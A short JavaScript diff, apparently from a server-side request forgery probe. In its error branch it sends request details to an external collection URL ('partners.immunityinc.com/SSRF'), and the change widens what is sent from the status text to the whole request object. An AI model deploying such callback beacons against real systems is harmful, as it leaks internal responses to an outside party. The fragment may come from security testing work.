@@ -12,7 +12,7 @@ function handler() {
   } else {
     // something went wrong
     var xhr2 = new XMLHttpRequest();
-    xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&error='+encodeURIComponent(this.statusText), true);
+    xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&error='+encodeURIComponent(this), true);
     xhr2.send();
   }
 }
